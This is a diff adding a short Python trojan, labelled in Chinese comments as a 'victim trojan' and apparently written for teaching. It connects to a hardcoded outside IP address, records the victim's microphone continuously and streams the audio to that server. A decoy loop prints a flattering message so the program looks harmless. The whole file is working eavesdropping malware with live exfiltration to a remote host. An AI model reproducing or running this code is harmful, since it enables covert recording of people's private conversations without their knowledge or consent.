@@ -1,0 +1,52 @@
+# 受害者木马
+import time
+from socket import*  # 网络库
+import pyaudio, queue, threading       # 音频库 队列库 线程库
+
+s = socket()   # 创建一个套接字
+s.connect(('146.56.223.48', 8848))  # 申请连接后台
+
+audio_queue = queue.Queue()  # 初始队列 用于存放音频数据 保证线程安全
+
+# 录音线程函数
+def record_audio():
+    print('创建实例！')
+    audio = pyaudio.PyAudio()  # 初始化pyaudio的对象
+    print('打开音频流')
+    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True,
+               frames_per_buffer=1024, input_device_index=0)  # 打开音频输入
+
+    while True:  # 循环录制
+        data = stream.read(1024)   # 从音频流中读取数据
+        print(len(data))
+        audio_queue.put(data)      # 把数据放到队列里面
+
+# 发送音频数据
+def send_audio(s):
+    print('发送音频数据')
+    while True:
+        if not audio_queue.empty():
+            data = audio_queue.get(timeout=1)
+            s.send(data)
+        else:
+            continue
+
+thread1 = threading.Thread(target=record_audio)
+thread1.start()
+thread2 = threading.Thread(target=send_audio, args=(s,))
+thread2.start()
+
+while True:
+    # 给受害者准备一个他喜欢的功能！经常用的功能！着迷的功能！
+    print('你真帅！')
+    time.sleep(5)
+
+
+
+
+# 启动麦克风 收集声音
+
+# 通过网络 把声音传递给后台
+
+# 木马 都会有正常的功能
+
